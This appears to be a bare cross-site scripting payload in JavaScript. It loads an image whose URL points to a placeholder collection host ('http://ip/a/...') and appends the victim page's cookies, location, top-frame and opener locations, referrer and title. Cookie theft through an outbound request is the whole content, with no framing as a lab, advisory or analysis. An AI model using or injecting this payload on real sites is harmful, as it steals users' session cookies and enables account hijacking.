var x = new Image();
try {
    var myopener = '';
    myopener = window.opener && window.opener.location ? window.opener.location: '';
} catch(err) {}
x.src = 'http://ip/a/项目文件地址/?location='+escape(document.location)+'&toplocation='+escape(top.document.location)+'&cookie='+escape(document.cookie)+'&opener='+escape(myopener)+'&referrer='+escape(document.referrer)+'&title='+escape(document.title);